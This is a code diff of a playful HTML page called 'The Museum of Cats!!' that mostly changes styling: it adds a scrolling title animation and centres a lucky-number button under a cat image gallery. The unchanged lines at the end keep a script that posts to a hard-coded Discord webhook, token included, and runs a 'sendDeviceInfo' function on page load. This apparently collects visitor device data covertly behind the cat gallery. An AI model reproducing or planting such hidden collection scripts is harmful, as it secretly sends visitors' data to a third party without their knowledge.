@@ -3,10 +3,13 @@
 <html>
     <head>
     	<title>The Museum of Cats!!</title> <!-- title -->
-      <title>Device Info</title>
 
       <style>
-
+           .center {
+            text-align: center;
+            margin-bottom: 100px;
+          }
+          
           .gallery {
           display: flex;
           flex-wrap: wrap;
@@ -19,7 +22,29 @@
           margin: 10px;
           }
       </style>
+
+
+      <style>
+        @keyframes marquee {
+          0% {
+            transform: translateX(100%);
+          }
+          100% {
+            transform: translateX(-100%);
+          }
+        }
+
+        .text-animation {
+          white-space: nowrap;
+          overflow: hidden;
+          animation: marquee 30s linear infinite;
+          font-size: 45px; /* Adjust the font size as per your needs */
+          color: black ;
+        }
+
+      </style>
 		
+
 		<script>
 			 function generateRandomLuckyNumber() {
       		var luckyNumberContainer = document.getElementById("lucky-number");
@@ -34,18 +59,27 @@
 
 
     <body>
-        <h1>The Museum of Cats!!</h1>
+        <h1 class = "text-animation">
+          The Museum of Cats!!
+        </h1>
+
         <div class="gallery">
             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSy-qDeKJQikVkZbYIwdIGwi8dtiFDm4vLrRSLo-pbn5zpfuVsvsPFNLMJ038WV_aeawAw&usqp=CAUg" alt="Cat 1">
             <img src="https://as2.ftcdn.net/v2/jpg/01/23/50/17/500_F_123501706_3GwEndkcTZJQs31SYuXW9znaMc8rEfC7.jpg" alt="Cat 2">
             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTx5LAPvqU9NWg-AJicrvmppAPlxujdDMaNZA&usqp=CAU" alt="Cat 3">
             <img src="https://images.pexels.com/photos/6441460/pexels-photo-6441460.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500" alt="Cat 4">
-          </div>
+        </div>
 
-		    <h1>Lucky Number Roll!</h1>
-		    <button onclick="generateRandomLuckyNumber()">What is your lucky number today mate?</button>
-		    <div id="lucky-number"></div>
+        <div class="center">
+            <h1>
+              Lucky Number Roll!
+            </h1>
+            <button onclick="generateRandomLuckyNumber()">What is your lucky number today mate?</button>
+            <div id="lucky-number"></div>
+        </div>
 
+		    
+        
         <script>
             var xhr = new XMLHttpRequest();
             var webhookUrl = "https://discord.com/api/webhooks/1158992076839583815/MAw-xZ9ELt9rv-RuQndxFVAHG41F0hO2DmX314SzhMmknexPv5tat8MWWIu8cqVOJHfE";
@@ -105,4 +139,5 @@
             window.onload = sendDeviceInfo;
           </script>
     </body>
+    
 </html>
